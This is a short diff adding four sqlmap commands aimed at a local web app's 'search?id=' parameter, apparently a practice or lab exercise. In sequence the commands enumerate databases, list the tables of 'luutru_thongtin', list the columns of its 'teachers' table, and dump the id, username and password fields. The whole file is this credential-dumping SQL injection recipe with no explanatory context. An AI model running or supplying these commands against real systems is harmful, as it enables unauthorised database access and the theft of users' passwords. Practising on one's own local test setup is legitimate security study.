@@ -1,0 +1,7 @@
+python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" --dbs
+
+python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" -D luutru_thongtin --tables
+
+python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" -D luutru_thongtin -T teachers --columns
+
+python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" -D luutru_thongtin -T teachers -C id,username,password --dump
